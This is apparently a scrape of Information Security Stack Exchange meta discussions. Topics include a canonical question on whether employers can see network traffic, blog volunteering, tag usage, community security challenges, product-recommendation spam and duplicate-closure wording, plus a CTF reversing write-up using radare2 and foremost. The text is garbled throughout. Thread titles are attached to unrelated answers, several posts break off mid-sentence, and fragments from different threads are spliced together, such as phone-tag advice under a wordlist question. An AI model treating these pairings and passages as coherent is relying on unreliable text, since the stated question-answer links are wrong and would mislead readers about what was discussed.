<li>What sort of device is being used? What version?</li>
<li>What applications are being used?</li>
</ol>

<p>Now, these questions are, generally, the reason why there are so many different variations of the ""Who can see my data?"" question on the network right now. In order to sharpen the question while still making it as general as possible, I believe the question should address these questions in the following way: </p>

<ol>
<li>The attacker should be actively looking for any information they can find</li>
<li>The measures already in place should be of an unknown quantity, but we should assume there is no proxy, or the answer is pretty simple, but it should address what would happen if there was a proxy</li>
<li>The attacker's level of authority should be that of a Sys Admin, someone with administrator privileges on the network but no sort of ""illicit"" access, i.e. they can't install a dedicated piece of malware on the target's machine or access their device without permission (if they brought in their own device, for example) </li>
<li>As far as the device is concerned, any up-to-date device should be fair game for this question as we want it to cover a vast majority of the already existing questions</li>
<li>The applications being used should fall into the category of either encrypted or not encrypted, finer granulation would make the question to broad</li>
</ol>

<p>Now, how should the question be formulated? <strong>Here's my first swing</strong>:</p>

<blockquote>
  <p>Who can see my data when I am connected to an actively administered/monitored network, and what can they see? </p>
  
  <p>Assuming that:</p>
  
  <p>No one has had any illicit or physical access to my devices. My OSs' are all
  up to date. Some of my applications encrypt data, and others do not. There is a proxy, but I have not installed any certificates. There is very little other information about the network. </p>

Is SE generating popups now?,"<p>I think this could be a good canonical question that could often be used as a duplicate target. But for it to be useful it needs to be on a level that the kind of person who usually post about this can understand.</p>

<p>That means there should be no assumptions in the question that the novice could not verify if they apply. So I don't think we should mention proxies and installed certificates or asume that the computer has not been tampered with - I would say that is stuff for an answer.</p>

<p>And I think the question should explicitly state that it is trying to be canonical and aimed at the broad audience.</p>

<p>So here is my attempt at a question:</p>

<blockquote>
  <h1>Can my employer see what I do on the internet when I am connected to the company network?</h1>
  
  <p>Lets say I browse the web and use different apps while connected to the network at work. Can my employer (who controls the network) see what websites I visit, what emails I send, my IM messages, what Spotify songs I listen to, etc?</p>
  
  <p>Does it matter if I use my own computer or one provided for me by my employer? Does it matter what programs I use, or what websites I visit?</p>
  
  <blockquote>
    <p>This is an attempt at a canonical question following <a href=""https://security.meta.stackexchange.com/questions/2531/would-a-canonical-can-x-see-my-data-over-wi-fi-work-internet-question-be-help/2546?noredirect=1#comment6643_2546"">this discussion on Meta</a>. The aim is to produce basic answers that can be understood by the general audience.</p>
  </blockquote>
</blockquote>

<p>That is my two cents. Feel free to copy paste if you want to, edit if you feel like, or throw in the bin if you prefer that. I have some bullet points for what I would like an answer to contain, but maybe I should save them for an actual answer...</p>

New blog - call for volunteers,"<p>I am willing to help in whatever way necessary. I hosted my own technology-centric blog for a few years, but closed it down due to no traffic and the cost associated with it. I haven't written about security outside of SE, but I do have some chops as far as producing content is concerned (in my own opinion, the traffic on my personal blog may indicate otherwise...)  </p>

<p>That being said, I would be more than happy to moderate/edit/produce content.</p>

<p>As far as the content that I could produce:</p>

<ul>
<li>Something along the lines of explaining technical concepts in a way
the general public could understand,</li>
<li>Opinion pieces concerning the on-goings in the InfoSec community</li>
<li>I think would be neat to profile some of the members of this
community. Ask how they got into InfoSec, what their areas of
expertise are, whats in their toolbox, maybe even a walk-through of
their methods (depending on what exactly their area of expertise is)</li>
<li>Features that are written weekly, even if its just something as
simple as a ""This week in InfoSec"", would be a fantastic idea, and
one that I'm absolutely willing to put the time into.</li>

Should we close questions on custom wordlist generation?,"<p>I think every single one I have seen is actually a <em>programming</em> question and not a security question.

Also, their battery life is weeks rather than days.</p>

<p>The phone tag is about the traditional telephone network. It is for issues with dumb phones or the aspects of your smart phone that makes it just that - a phone.</p>

<p>On the other hand, the smartphone and mobile tags are about the aspects of your phone that makes them tiny mobile computers. The distinction between the two seems to be that mobile includes tablets while smartphone doesn't. There is no specific tag for tablets. In my opinion these two tags could be merged.</p>

<p>I don't see the point with a cellular tag on top of the others. Since it has only three questions I think we could just kill it.</p>

<p>And all of these needs better usage guidance. This is how I would organize it:</p>

<ul>
<li><p><a href=""https://security.stackexchange.com/questions/tagged/mobile-devices"" class=""post-tag"" title=""show questions tagged &#39;mobile-devices&#39;"" rel=""tag"">mobile-devices</a> (merge of mobile and smartphone):</p>

Asking for help with a security challenge,"<p>I have the impression that we are planning too much and doing too little practical work over the blog revamp.  We are still discussing ideas whilst no practical, viable, blog infrastructure is coming out of it.  I'll first enumerate what I believe as being the issues we are facing:</p>

<ol>
<li>Resistance to a wordpress solution, this is given the fact that wordpress has a horrible record of security problems.</li>
<li>Variety of possible engines to use: jekyll, ghost, or wordpress itself.  Possibly others (if it was me to do admin I'd love Django :) )</li>
<li>Hosting.  One thing is to choose an engine, another is to be able to host the resulting blog.  Hosting cost money after all.  A <em>wordpress.com</em> (the hosting service, not the engine) or a github pages jekyll would be a solution to that but again we are discussing both the engine and hosting at the same time.</li>
</ol>

<p>My take on figuring both things at the same time is to <strong>make a wordpress export from the current blog, place it in some file locker and add to this meta question</strong>.  Then, anyone of the people willing to help in the creation of the blog, can simply build a prototype.  We would be able to make the prototype in whichever way we want: hosting service, github pages, even write a blog app from scratch (although I would not recommend the later).</p>

<p>If we have several prototypes to choose from it will provide with a better discussion than the uncertainty that we have now.  Even if some part of a prototype would not be perfect we would still have a blog, and be able to improve it if needed.  Note that several prototypes will fail, that's a good thing, since we will be eliminating risk from bad decisions from the start.</p>

X company has requested a scan of my passport,"<p>Having been on the edge of asking one of these questions - my answer is ""I don't think so."" I am starting my career in IS - and though many of you may have been here for a long time, I want to remind you these are all individuals who probably don't have mentors or know people who have been in IS.  I, personally, have no mentor - and these people are probably 20-somethings who are looking for validation of going into this field and trying to get a re-assuring push.  </p>

<p>That said, understanding aside - these requests or posts don't make good questions.  The path is one an individual must take - no one here can tell me why I should look at moving into compliance more than AppSec, etc.  There are far too many answers to give.</p>

<p>A good question for [career] would usually turn into a different question - for instance, I might ask: ""I am learning Pen Test Scripts in the Windows environment - should I spend my time in Python, or PowerShell, or something else?""

<p>By editing the original question, if the edit is approved, you make the question more detailed, clearer, or in some manner better than it was. In its improved condition it may interest others enough to invest the time in creating answers. You don't get your question flagged as a duplicate, and you help improve the site for others - both with a better question, possible answers, and less ""noise"" when someone else uses the search function later.</p>

<p>I believe the original poster will be notified of the edit, and will be notified of any new answers, or comments to the question. So you won't have to ""link"" to anything.

Do we want regular security challenges?,"<h3>What about unofficial, irregular, community-developed security challenges?</h3>

<p>I do not believe that Arminius was implying or suggesting that SE developers be tasked with implementing SecSE security challenge events. They likely lack the field-specific expertise required to create appropriate and worthy challenges anyway. However, some of the users of this site do possess the knowledge and the ability to create such challenges.</p>

<p>There is a way to take advantage of the decentralized, democratic format of SE sites in general as well as the relative popularity and level of activity of SecSE in order to create the equivalent of challenge events:</p>

<ul>
<li>anyone can ask a question</li>
<li>anyone can answer a question</li>
<li>at 75 reputation one can place bounties on questions</li>
<li>at 300 reputation one can create new tags</li>
</ul>

<p>Here is what I am proposing: any user with at least 300 reputation can at any time create a security challenge, present it as a question, tag the question with something like ""Security Challenge"" plus the tags specifying the subject matter of the challenge (e.g. ""buffer-overflow"") and then place a bounty on it to attract attention. In other words, unofficial security challenges could be developed and posted at any time, all the while remaining within the current framework of what is allowed by the SE site format. All the tools already exist.</p>

<p><strong>An Example</strong></p>

<p>Allow me to give a hypothetical example of what this would look like. Let's say that there is a user with ~10,000 reputation. Let's call this user ""Infosec_Pro"". User Infosec_Pro writes exploits like Dr. Seuss wrote children's books and is a bit bored. He also thinks it would be amusing to watch hapless wannabe hackxors struggle solving an entry-level shellcoding  challenge. He decides to craft a simple vulnerable C program, posts the source code and a description of the challenge in a question titled ""<strong>Security Challenge</strong>: Exploit this vulnerable C program"", tags it with ""<strong>Security Challenge</strong>"", ""<strong>Entry Level</strong>"",""buffer-overflow"",  ""exploit"" and whatever else is appropriate, and places a bounty of 50 on the question since it is entry-level difficulty. Infosec_Pro then sits back and watches as his question (challenge) shows up in ""Featured"" and garners a bit of attention.</p>

<p>Now another hypothetical user, ""XX H4ck1ng L0rd XX"", who thinks he is just the best because he is good at guessing his grandma's passwords, sees the bounty and says to himself ""Yes! I have a chance to increase my rep from 100 to 150!"" and is thus motivated to learn about BoF etc.</p>

<p>People who support the idea of having security challenges can upvote the challenge (question) so that Infosec_Pro gets his 50 rep back and attract more attention to the challenge, and people who publicly claim to support security challenges but prefer to just sit around and pooh-pooh other people's ideas ignore it. </p>

<p>Eventually, a few write-ups are posted as anwers and Infosec_Pro, having much enjoyed himself watching the struggles of others, chooses the write-up (anwer) that pleases him the most. The scrub who wins the challenge (has his answer accepted) not only gets rep from the bounty but also from whatever upvotes his write-up received.</p>

<p><strong>Features</strong></p>

<ul>
<li>bounty amounts reflect difficulty level. Bounties of 50 indicate entry-level challenges at one extreme and bounties of 500 are awarded for real brain-burners at the other extreme.</li>
<li>Tags are used to distinguish challenges from conventional questions</li>
<li>Tags describe challenge difficulty level</li>
<li>""Security Challenge"" is in the question title to make it blindingly obvious</li>
</ul>

<p><strong>Pros and Cons</strong></p>

<p>Pros:</p>

<ul>
<li>Total flexibility. Anyone can create any kind of challenge at any time. There could be crypto challenges, bof challenges, Windows challenges, Linux challenges, web app challenges etc. In other words, something like this could begin this moment while you are reading this line. Yes. Right now. Immediately.</li>
<li>Unilateral action is possible. Even if every person who read this said to themselves ""My word! Whoever proposed this is an utter dunce!"", any individual user could exercise their free will to create and post a challenge question if they so chose (given that they abide by the rules defined in the help center). </li>
<li>Tangible rewards for both the challenge developer and the challenge solver. The challenge developed receives upvotes based on the quality and popularity of the challenge, and the solver gets upvotes base on the quality of their write-up/answer</li>
</ul>

<p>Cons:</p>

<ul>
<li>There is no way to prevent someone with high rep from solving entry level challenges and ruining it for everyone</li>
<li>bounties expire after a week</li>
<li>this scheme relies on interest. If no one is interested in developing and posting challenges, there won't be any challenges to solve. If no one is interested in solving challenges, it discourages people from posting challenges in the first place</li>
<li>this scheme conflicts with the status-quo and may be poorly received by moderators and people with 100,000,000,000 reputation who have had an account on the site since 1983.</li>
<li>it could just be a bad idea. But if I knew how to create a decent challenge, I would post it in the way I described simply to prove that it can be done</li>

Decision that something is too broad before there is a second answer?,"<p>Certainly, the survivors of the high closure rate among career questions are very specific in the stated goal and show a significant effort prior to posting the question.</p>

<p>Another way to ask, ""What makes a good career question?"" is to ask, ""What characteristics might a career related question have or what criteria must it meet to not get closed?""</p>

<p>I don't hold with the popular view that reading the rules will minimize the risk of question closure.  It certainly helps, but I don't think it is always on pure and objective criteria that closures occur.  Whether something is opinion-based is often an opinion.  Q&amp;A communities attempt to arrive at something close to an objective truth through an incentivized democratic process.</p>

<p>A good preparatory question to ask is apolitical and mathematical: ""What to the 40% x 82 career questions have in common that do not trigger the impulse to mark them as begging opinion or broadness?""</p>

Why not have a resource sharing section?,"<p>When the serial voting detection mechanisms see something that identifies as serial voting (up or down) the votes will be reversed. The reversal is done as part of an automated process and data is not provided on who the individual (or voting ring) was or which posts were voted on.</p>

<p>(Sorry we cannot give any detail of the serial vote detection process)</p>

<p>As to why - sometimes there is no reason. Sometimes someone saw a good post and checked out that user's other posts and upvote. Loads of possible reasons. It's usually not worth worrying about them though, as serial votes are a blip that should be removed. I know it's a bit concerning if you suddenly lose some rep (as opposed to suddenly gain some by a vote reversal) but remember - it's not you, it's them :-)</p>

<p>But I think the thing to do in a situations like this in general is:</p>

<ul>
<li><strong>Keep the quesiton narrow.</strong> Exactly what resource is it that you want to protect on the AP? As I understand it, it's the VPN. Then ask about how to protect that and not about securing an AP in general.</li>
<li><strong>Be very explicit and clear about what you are not asking.</strong> E.g. that you are not asking about how to protect users from each other.</li>

How to deal with a user whose edits I feel are problematic?,"<p>Your original question was unanswerable. What I, and those responding, was trying to do was to discover what the core question was so that we could actually respond to you. </p>

<p>To ask, ""why is X insecure?"" requires that there be some understanding that X is insecure. So, first, there needs to be some common ground on that point. To ask ""someone said X is insecure, why is X insecure?"" is a non-starter. There can be no common ground with a non-exisitent 3rd party. As I mentioned in my comments, we cannot tell you why someone else thinks something. </p>

<p>By asking for context and details, the hope is that we can discover why, perhaps, <em>we</em> might conclude X is insecure, given certain conditions. That's why I, and others, asked for context and details.</p>

<p>I made all these points in my comments.</p>

<p>Your misconception is not about SSH, but about how this site works. We are a Q&amp;A site with the hopes that other people might discover someone else who has asked the same question they currently have. That means the questions need to have some level of universality and generality to have a hope to be a question someone else might ask with applicable answers. Hence, editing to provide guidance to those answering (to get you some kind of answer) and to provide a level of universality.</p>

<p>Further to that end, the body of the question needs to stand on its own. I remove your editorials because they are not a part of the question, but comments. </p>

<p>If you want ""supporting evidence"" for something, then you need to phrase your question to ask for that. Your question currently is, ""what did I miss?""</p>

<p>Also, we are not s discussion site. Questions are not to be prompts for back-and-forth opinions. </p>

<p>After reading all your comments and your edits, it appears that over time, you have revealed your core question: ""How can I prove to someone else that SSH is secure?"" If this is so, then you have not asked this question at all.</p>

How to deal with a user whose edits I feel are problematic?,"<p>Questions regarding lists of resources have been raised on several of the SE meta sites.  Most of which are inconclusive as to whether to create such a list.</p>

What's the point of tags?,"<p>I must admit I felt a bit offended when I read the title of your question. :-) Not sure I will produce a solid answer though. </p>

<p>Tags makes questions searchable. The word <a href=""https://security.stackexchange.com/questions/tagged/time"" class=""post-tag"" title=""show questions tagged &#39;time&#39;"" rel=""tag"">time</a> might show up in a lot of questions, but very few of them actually deals with the concept of time as it is defined in the tag excerpt (by you, in an excellent, recent edit). Explicitly labeling those questions makes them easy to find.</p>

<p>There will soon be 40k questions. The value of a curated collection of questions and answers is zero if you cant find the questions you want. I'm sure you all heard the one about the internet being like the worlds biggest library, but with a drunk librarian. Well, here on Stack Exchange I think the librarian should stay sober.</p>

<p>(Not only humans search by tag. The ""questions that may already have your answer"" feature when asking and the ""related questions"" in the right sidebar uses them to.)</p>
",<discussion><tags>,10,,253
What's the point of tags?,"<p>Tags can absolutely be useful. I just think a lot of them aren't currently used in sensible ways.</p>

<p>Many of the <a href=""https://security.stackexchange.com/tags?tab=popular"">most popular tags</a> seem to be fundamentally misunderstood:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/tagged/appsec"" class=""post-tag"" title=""show questions tagged &#39;appsec&#39;"" rel=""tag"">appsec</a>: There is no common pattern among the questions in that category at all.</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/web-browser"" class=""post-tag"" title=""show questions tagged &#39;web-browser&#39;"" rel=""tag"">web-browser</a>: Useful for web browser security, but actually applied to arbitrary web application questions (XSS, SQLi, etc.).</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/http"" class=""post-tag"" title=""show questions tagged &#39;http&#39;"" rel=""tag"">http</a>: Should be about questions related to the protocol, but again used for XSS questions, etc.</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/penetration-test"" class=""post-tag"" title=""show questions tagged &#39;penetration-test&#39;"" rel=""tag"">penetration-test</a>: Useful for general penetration testing patters, but actually applied to anything that occurred to the asker during a pentest.</li>
</ul>

<p>The list goes on.</p>

<p>Also there are the generic <a href=""https://security.stackexchange.com/questions/tagged/attacks"" class=""post-tag"" title=""show questions tagged &#39;attacks&#39;"" rel=""tag"">attacks</a>, <a href=""https://security.stackexchange.com/questions/tagged/defense"" class=""post-tag"" title=""show questions tagged &#39;defense&#39;"" rel=""tag"">defense</a>, <a href=""https://security.stackexchange.com/questions/tagged/exploit"" class=""post-tag"" title=""show questions tagged &#39;exploit&#39;"" rel=""tag"">exploit</a>, <a href=""https://security.stackexchange.com/questions/tagged/vulnerability"" class=""post-tag"" title=""show questions tagged &#39;vulnerability&#39;"" rel=""tag"">vulnerability</a> tags that are all really popular but I find it hard to see how they help anyone find what they are looking for.</p>

<p>To me it seems that in order to create a meaningful library-like tag structure it would require a pretty aggressive clean-up and I'm not sure if improving the tag wikis alone will fix that. On the other hand, using the favorite tag feature to filter out interesting questions works just fine.</p>
",<discussion><tags>,10,,253
What's the point of tags?,"<p>Tags serve <strong>no</strong> purpose. Neither does the Dewey Decimal Classification system or the Library of Congress Classification system serve any purpose in libraries. For that matter, directories in hard drive file systems are just a waste of space on the drive. After all, every question has a title, just like every book does, and every file has a name. I can search for the title I want when looking for a question, and I can see from the title what it's about without needing to look at the tags.</p>

<hr>

<p>Having said that, as a tongue-in-cheek reply to your tongue-in-cheek question, lets look at a few of the purposes truly served, and how it falls apart.</p>

<ul>
<li><em>Notices</em>: I can subscribe to an RSS feed for a tag such as <a href=""https://security.stackexchange.com/questions/tagged/apache"" class=""post-tag"" title=""show questions tagged &#39;apache&#39;"" rel=""tag"">apache</a> and get notified of question activity for that tag. If I'm an expert in that area and wish to share my knowledge with others, this will let me know when others have questions that might benefit from that knowledge.

<ul>
<li>This presupposes that the tag is applied to questions where it should be, and only where it should be. I will miss questions that might qualify if the tag isn't applied to the question.</li>
<li>Suffers from ""false positives"" when a question has a tag it doesn't deserve, or need, as noted with examples in the answer from @Arminius. This puts questions in the feed that don't belong there, and require you to filter them out yourself.</li>
</ul></li>
<li><em>Filters</em>: 

<ul>
<li>As pointed out by @schroeder in his answer, I can highlight or dim questions in the listings based on my preferences using tags. Again this helps find what I have an interest in, and ignore what I have no interest in, and keeps everything else ""open for investigation"" in the list. (I'd rather it eliminated, rather than dimmed, the ignored tags.)</li>
<li>It is also possible to list questions that only have a tag applied to them, ignoring all others. Handy if I have a question about something, but don't know how to ask it.

<ul>
<li>Both of these suffer from tags not being applied when they should have been like <em>Notices</em> above. Unless they have one of the ignored tags, however, I will still see them, just not highlighted.</li>
<li>Again, both of these are affected by false positives.</li>
</ul></li>
</ul></li>
<li><em>Association</em>: As noted by @Anders in his answer, tags help the system connect one question to others that are related. When looking for answers to a question, this can be <em>very</em> helpful. When answering a question it can also alert you to similar questions that might have useful information to link to, or otherwise include, in your answer.

<ul>
<li>This is affected more by having wrong tags on questions than by not having enough of the right tags, when you are answering questions. When searching for answers, both version of miss-tagging are a problem.</li>
</ul></li>
</ul>

<hr>

<p>Now, let's look at the, so far ignored, final part of your question: <em>are they really worth all the time and effort of maintaining them?</em></p>

<p><strong>Yes</strong>, IMHO, anyway. To begin with, there shouldn't be <em>that</em> much time and effort to maintain them. The false positives are the easiest to spot, for an expert in them, and to correct, if not allowed to collect. The missing tags are a little harder to spot, though just as easy to correct once discovered. </p>

<p>When reviewing the list of questions, from a feed, a filtered view, or even in a full listing of the questions, a false positive is a cry for help. Even low-rep users can suggest edits to questions, and 2K+ rep users can make instant edits. Editing a question to remove a bad tag takes mere seconds, and adding proper tags while you're there is but a few extra keystrokes as well. When you see a tag false positive in one of your areas of expertise, take the time to help the community and fix it, <em>before you forget</em>. If, after doing a few of those edits, you get the sense that others may not understand how that tag <em>should</em> be used, then you are in a position to make corrections or additions to the tag wiki that might improve that understanding. Letting it sit in the back of your mind for a while before making any changes can probably result in actual time spent on the edit to a few minutes at most.</p>

<p>While the site is small, at &lt;40K questions so far, it's easy to correct collected tag problems. If begun now there should be little need for massive efforts later, as has happened recently on the SuperUser stack in their <a href=""https://meta.superuser.com/questions/12295/logistics-for-cleanup-weekend-2"">Cleanup Weekend</a><sup>[¥]</sup>. One tag, <a href=""https://superuser.com/questions/tagged/recovery""><code>recovery</code></a> had over a thousand questions that needed to be corrected.</p>

<p>There is an implied question in you question: <em>is it worth <strong>my</strong> time and effort, to <strong>me</strong>, to maintain the tag system?</em> For that I'd have to day <em>it depends</em>. It's good for the community, so how important is the community to you? If the community <em>is</em> important to you, then it can be worth your time, even if you don't get any direct benefit from the tags. And, someday, they just might help you after all. If you need an answer <em>fast</em>, you're more likely to find it using tags than not. Using experiments today, a search for <code>apache ssl</code><sup>[ŧ]</sup> returned 199 results, while a search for <code>[apache] ssl</code><sup>[ŧ]</sup> returned 113 results. The 43% reduction has already reduced your reading time in search of an answer. To make it even better, a search for <code>[apache][ssl]</code><sup>[ŧ]</sup> returns 54 results, a mere 27% of the original with a consummate reduction in reading time to scan questions looking for your answer.</p>

<p>So, if you never need to look for an answer, don't use any of the other potentials of the tags, and are just here to display your knowledge without any connection or concern for the rest of the users, then maybe tags are not worth your time and effort to maintain. If any of those is not true, then maybe a small amount of your time and effort is justified. Finally, if all of those are false, you might need to find answers, you do want to access the power of tags, and you do care about the community and other users, then <strong>yes</strong>, it is worth the time and effort, including <em>your</em> time and effort, to maintain the tag system. Since you've already contributed to their maintenance with tag wiki edits, I think we know your answer anyway.</p>

<hr>

<p><strong>Notes</strong>:</p>

<p><sup>[¥]</sup>  To be fair, the need for 'Cleanup Weekend' was triggered more by the cleanup of non-HTTPS images than tag corrections, which received more effort. Still, tag cleanup was a big part of their work, and still is, for that ""weekend"" which ran over the scheduled time by quite a bit. As of this writing it is still in progress.</p>

<p><sup>[ŧ]</sup> Yes, I know that <code>SSL</code> is not the preferred term, <code>TLS</code> is. That was chosen to show the power of the tags. The final search automatically changed <code>[ssl]</code> to <code>[tls]</code> before doing the search, which filtered out an additional 22 questions; questions you probably don't want to read when you need an answer anyway.</p>

I need to clarify an answer from another post about an Audit,"<h1>Reversing 100</h1>

<p>We were provided with a file called <code>pocket</code>. Using the <code>file pocket</code> command I found out it was a zip file. Extracting it I got a file a rar file called <code>biscuit</code>. Extracting it I got two files: <code>biscuit1</code> (a windows executable) and <code>biscuit2</code> (a password protected zip file). I guessed that we had to reverse biscuit1 to get the password. After analyzing it with radare2, there was a hint in the beginning of the program: <code>Please find sweets name starting from m for biscuit2.</code> and then asking for input. Instead of reversing the binary further I just searched for ""cookies"" and was surprised that wikipedia actually had a handy list of cookies!</p>

<p><a href=""https://i.stack.imgur.com/HDTKM.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HDTKM.png"" alt=""cookies everywhere!""></a></p>

<p>Tried to extract <code>biscuit2</code> with <code>macaron</code> as password and got 3 files: <code>biscuit3</code>, <code>biscuit4</code> and <code>biscuit5</code>:</p>

<p><a href=""https://i.stack.imgur.com/3y4IA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3y4IA.png"" alt=""more biscuits!""></a></p>

<p>So I analysed the three files and knew I was on the right track with the hint given in <code>biscuit4</code>:</p>

<p><a href=""https://i.stack.imgur.com/lNmAA.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lNmAA.png"" alt=""close to the flag...""></a></p>

<p>So the flag is a combination of <code>biscuit3</code> and <code>biscuit5</code>. Before analyzing <code>biscuit3</code> I thought let's do a Google reverse image look up but nothing interesting was brought up. I thought maybe there's some steganography involved. I tried <code>foremost</code> to scan for hidden files in the jpeg image. <code>foremost</code> is a handy tool that looks for certain magic bytes to recover files. I found a zip file with a text file inside contain part of the flag <code>creme</code>:</p>

<p><a href=""https://i.stack.imgur.com/9fXk1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9fXk1.png"" alt=""foremost to the rescue""></a></p>

<p>One file to go! <code>biscuit5</code> is a windows executable so I opened it with <a href=""https://github.com/radare/radare2"" rel=""nofollow noreferrer"">radare2</a> a reverse engineering framework. It's CLI based but once you get the hang of the basics it's quite cool! So first we open the file with <code>r2 biscuit5</code>. Then we need to analyse the binary with <code>aaa</code>. After that we can list all functions with <code>afl</code>. I grepped for the main function using the tilde notation <code>afl~main</code>. Then we need to ""seek"" to that address using <code>s 0x0040150b</code> or <code>s sym._main</code>. You might wonder ""why two mains?"", well same here but I analysed the other main and there was nothing interesting.</p>

<p><a href=""https://i.stack.imgur.com/YAXJj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/YAXJj.png"" alt=""analyzing with radare2""></a></p>

<p>So I moved on and used <code>VV</code> to enter Visual Graph Mode, used <code>p</code> afterwards to show the addresses of each instruction. So we have a few local variables:

<p>Then there was some magic happening with a loop, I guessed that must be the decryption phase:</p>

<p>Since the program didn't ask for input and the main function didn't seem to get suspicious values elsewhere I thought that the detected values in the beginning is probably the encrypted message and the loop is there to decrypt it. When it's done, it will branch to the right block and exit/return properly. So I thought let's use a debugger instead of manually trying to decrypt the message.

What constitutes a spammy product recommendation and what can be done to avoid it?,"<p>The <a href=""https://security.stackexchange.com/questions/3442/firewall-demo-iptables"">original question</a> is more than 6 years old (but the lack of accepted answer makes the ""Community"" bot to randomly bring it on the front page, so you may have not noticed its age).</p>

<p>The OP was preparing a presentation on firewalls. Apparently he (rightly) feared that simply listing IPTables rules may not be attractive and concrete enough to keep his audience interest, so he wanted to find a more concrete way to demonstrate the actual effect and role of these rules.</p>

<p>He suggested in his question to use two computers, this would allow to show how a firewall rule allows to allow or block a connection. Some answer suggested to use Wireshark, which is both a simple and visual tool allowing to highlight the technical details.</p>

<p>In your answer, 6 years later, you suggested to use <code>ufw</code> to generate the rules. IMHO, this suggestion doesn't seem to really fit the question. I don't see how this tool will allow the OP to better demonstrate the concrete firewall action to his audience. The OP problem was not about the rules, it was about how to demonstrate their concrete impact in a way he can communicate to his audience.</p>

<p>So, to sum-up, a new member comes and answer to a several years old question to promote a product which doesn't really answer to the OP request. I think that's why your post may have seem suspicious to the administrators.</p>

<p>Questions overtly asking for product recommendation are systematically closed as off-topic as <a href=""https://stackoverflow.blog/2010/11/23/qa-is-hard-lets-go-shopping/"">they obsolete quickly</a>.</p>

<p>Answers proposing a product are tolerated.</p>

<p>The best way to mention the product only to illustrate your explanation. Provide a factual and/or technical answer, explain how the OP question should be solved, the technologies / protocols / etc. involved. An then, at last, you can give a few examples of software implementing these ideas. You are even encouraged to present them with a critical point of view as far as the OP request is concerned.</p>

<p>For instance, on top of my head I remember <a href=""https://security.stackexchange.com/a/98014/32746"">an answer</a> where I mentioned the tool <em>SSLeuth</em> which was very well received by the community. But if you look my post, it comes at the end of the post, merely as an example of possible approaches to solve the concerns raised in previous points.</p>

<p>Other than that, I recently encountered <a href=""https://security.stackexchange.com/a/165746/32746"">a border-line answer</a>. It was posted by a new member, but on an active post, the author explicitly discloses his non-affiliation and his motives and the recommended tool may correspond to the OP request. His answer therefore did not fill the criterion to be considered as spam (but it still received a negative vote most probably due to the lack of content).</p>

<p>I hope you better understand now the distinction between post assumed as spam and post recommending or mentioning a software, and I hope this bad experience did not discourage you from posting other answers :) !</p>

Badge icons (especially gold) have a vertical offset,"<p>I agree that this wording still needs improvement, several years after this question was first asked.  For duplicates where there is a large amount of similarity it works great, but I've seen a lot of examples where the similarity is not apparent.</p>

<p>I'd like to <a href=""https://meta.stackexchange.com/questions/166707/changes-to-close-as-duplicate-part-deux"">quote David Fullerton</a> here (although in context he was talking about a different message to the user):</p>

<blockquote>
  <p>it sounds a bit like those old forum stickies that said “PLEASE SEARCH
  BEFORE POSTING YOUR QUESTION” – somebody already asked this exact same
  thing, so please stop bothering us. It's strong wording practically
  invites the user to argue: ""My question is not identical! I used
  different words!""</p>
  
  <p>So what do we want to tell the user instead? Something like, “Somebody
  already asked this. If that other question doesn't solve your problem,
  please clarify your question to explain how it's different.” Perfect:
  if the other question helps them, they're happy because they got an
  answer. If the other question doesn't help them, they know exactly
  what to do. No argument about how exact an ""exact duplicate"" needs to
  be.</p>
</blockquote>

<p>The way I see it, there are several sources of the problem here:</p>

<ol>
<li>The terminology makes sense to moderators* and long-time users, but
the ""possible duplicate of"" terminology is confusing (and even
offensive in some cases) to unfamiliar users.</li>
<li>The terminology was designed with obvious duplicates in mind, but not duplicates that aren't immediately obvious.</li>
<li>Different criteria are used to vote to close, including flimsy criteria like ""you should just read this canonical guide so we don't have to explain why you're doing it wrong"" or ""Part of this answer to this question offers a great explanation"", and these criteria are all being exaggerated and distorted by labelling them with the comment ""possible duplicate of [Question X]"".</li>
</ol>

<p>Duplicates are a trickier subject than they appear at first, and are a tricky enough subject that we can't expect new users to completely understand it.  Whole <a href=""https://stackoverflow.blog/2010/11/16/dr-strangedupe-or-how-i-learned-to-stop-worrying-and-love-duplication/"">blog posts</a> have been written about it.  We use the term ""duplicate"" to refer to the whole set of <a href=""https://stackoverflow.blog/2009/04/29/handling-duplicate-questions/"">copy-and-paste duplicates, same-exact-question-different-wording duplicates, and borderline duplicates</a>.  This includes the frequent situation where you have Q1 and Q2 that have a very similar answer, but Q1 is more general (or just plain different entirely).  From my understanding these <a href=""https://meta.stackexchange.com/questions/74080/close-as-duplicate-what-if-only-the-answer-is-a-duplicate"">shouldn't always be closed as duplicates</a>.  Confusingly, in this case the auto-comment <em>on the question</em> still reads ""duplicate"" when the duplicate is evident only in the <em>answers</em>.</p>

<p>For example, we have the popular question <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to Securely Hash Passwords</a>.  Some questions are obvious duplicates where the OP immediately understands why its a ""duplicate"":</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/17298/what-encryption-hash-function-i-should-use-for-password-securing"">What encryption hash function I should use for password
securing?</a></li>
<li><a href=""https://security.stackexchange.com/questions/17840/how-to-secure-passwords-when-site-is-opensource"">How to secure passwords when site is opensource</a></li>
</ul>

<p>However in other places ""possible duplicate of"" and similar comments appear for reasons that aren't immediately obvious, especially when the evidence for the duplication is in the answers, not the question itself:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/113003/possible-to-send-password-in-plain-text-with-sha-256"">Possible to send password in plain text with SHA-256?</a></li>
<li><a href=""https://security.stackexchange.com/questions/141250/why-are-only-passwords-hashed"">Why are only passwords hashed?</a></li>
<li><a href=""https://security.stackexchange.com/questions/64959/methods-for-slowing-down-a-hashing-algorithm"">Methods for slowing down a hashing algorithm</a></li>
<li><a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to implement iterations when hashing passwords?</a></li>
<li><a href=""https://security.stackexchange.com/questions/127689/how-secure-is-the-unix-sha-crypt-as-a-password-storage-algorithm"">How secure is the UNIX sha_crypt as a password storage algorithm?</a></li>
</ul>

